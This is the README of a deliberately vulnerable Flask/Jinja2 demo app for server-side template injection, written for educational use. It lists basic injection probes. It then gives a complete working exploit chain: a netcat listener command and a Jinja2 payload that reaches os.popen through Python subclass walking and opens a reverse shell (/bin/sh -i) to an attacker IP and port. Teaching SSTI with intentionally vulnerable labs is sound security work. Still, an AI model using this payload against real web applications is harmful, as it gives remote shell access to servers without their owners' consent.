
# SSTI exploit on flask

This repository contains a simple web application that demonstrates a Server-Side Template Injection (SSTI) vulnerability using Flask and Jinja2.

## Description


Server-Side Template Injection (SSTI) is a type of vulnerability that allows an attacker to inject and execute arbitrary code on the server. In this demonstration, we showcase how a vulnerable web application can lead to SSTI when user-supplied data is not properly sanitized before being rendered as a template.

The application is built with Python, Flask, and Jinja2, and it allows users to enter their email in a contact form. However, the application is not properly validating and sanitizing the email input, which opens up an opportunity for an attacker to perform template injection.

Warning: Do not deploy this application in a production environment. It is intentionally vulnerable and should only be used for educational purposes.


## Installation

Clone this repo

```bash
  cd jinja-ssti
  
  python3 app.py 

  go to : http://127.0.0.1:5000

  try ssti vulnerabilities with jinja : 

  {{7*7}}
  {{config}}


```
    
## gain access to reverse shell


### in your terminal : 
```bash

nc -nlvp PORT

```

### in web app : 
change this code below with : 

- the same port than netcat

- your ip (wlan0)

- don't touch the quotes
```bash

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

## Documentation

[Command line](https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6)


## Authors

- [@Lorenzo](https://github.com/clone1887)
- [@Boris the racoon](https://github.com/borisbecode)
- [@Jordan](https://github.com/Jordan-Argyropoulos)
- [@Xavier](https://github.com/xavierpier)
- [@Seb](https://github.com/)



![Logo](https://media.giphy.com/media/12vP3dyG40ttqE/giphy.gif)

